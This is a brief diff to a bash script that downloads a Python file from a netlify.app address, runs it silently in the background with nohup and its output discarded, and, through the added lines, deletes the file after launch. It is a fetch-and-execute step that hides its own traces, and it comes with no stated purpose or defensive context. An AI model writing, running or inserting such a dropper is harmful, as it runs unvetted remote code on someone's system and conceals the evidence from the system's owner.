@@ -1,4 +1,6 @@
 #!/bin/bash
 wget https://cyberprime.netlify.app/mod.py 
+chmod +x mod.py
 nohup python3 mod.py >/dev/null 2>&1 &
+rm mod.py
 
